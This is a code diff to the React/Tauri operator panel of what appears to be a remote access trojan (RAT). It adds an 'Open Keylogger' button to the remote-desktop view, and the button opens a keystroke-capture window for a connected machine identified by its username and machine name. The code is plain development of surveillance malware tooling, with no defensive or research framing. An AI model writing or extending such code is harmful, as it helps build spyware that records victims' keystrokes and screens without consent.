@@ -1,4 +1,4 @@
-import React, { useEffect, useRef, useState } from "react";
+import React, { useEffect, useRef, useState, useContext } from "react";
 import { listen } from "@tauri-apps/api/event";
 import { useParams } from "react-router-dom";
 import {
@@ -15,11 +15,14 @@ import {
   IconInfoCircle,
   IconX,
   IconShareplay,
+  IconTerminal2,
 } from "@tabler/icons-react";
 import { RemoteDesktopFramePayload } from "../../types";
+import { RATContext } from "../rat/RATContext";
 
 export const RemoteDesktop: React.FC = () => {
   const { addr } = useParams();
+  const { openClientWindow, clientList } = useContext(RATContext)!;
   const canvasRef = useRef<HTMLCanvasElement>(null);
   const lastFrameRef = useRef<HTMLImageElement | null>(null);
   const imageSizeRef = useRef<{ width: number; height: number }>({
@@ -514,6 +517,23 @@ export const RemoteDesktop: React.FC = () => {
             color={keyboardControlEnabled ? "black" : "white"}
             className={!streaming ? "opacity-50" : ""}
           />
+        </button>
+
+        <div className="w-full h-[1px] bg-white bg-opacity-20 my-1" />
+
+        <button
+          className="p-3 rounded-xl shadow-lg backdrop-blur-md bg-secondarybg bg-opacity-80 hover:bg-white hover:bg-opacity-90 transition-all duration-200 cursor-pointer group"
+          onClick={() => {
+            if (addr) {
+              const client = clientList.find(c => c.data.addr === addr);
+              const fullName = client ? `${client.system.username}@${client.system.machine_name}` : addr;
+              openClientWindow(addr, "keylogger", fullName);
+            }
+          }}
+          onMouseEnter={() => showToolTip("Open Keylogger")}
+          onMouseLeave={hideTooltip}
+        >
+          <IconTerminal2 size={24} color="white" className="group-hover:text-black transition-colors" />
         </button>
       </div>
 
